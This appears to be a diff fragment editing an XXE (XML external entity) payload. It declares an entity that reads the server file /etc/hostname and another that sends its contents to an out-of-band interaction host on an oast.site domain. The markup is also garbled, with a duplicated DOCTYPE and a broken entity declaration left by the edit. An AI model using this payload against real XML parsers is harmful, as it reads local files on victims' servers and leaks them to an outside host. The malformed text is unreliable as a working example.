@@ -1,6 +1,6 @@
-<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [
  <!DOCTYPE foo [
- <!ENTITY % eval SYSTEM "
+ <!ENTITY % eval"
   <!ENTITY % file SYSTEM 'file:///etc/hostname'>
   <!ENTITY &#x25; xml SYSTEM 'https://nv2krib9rythidhbaumoeychhzu4w7lsv.oast.site?x=%file;'>
   &#x25;xml;
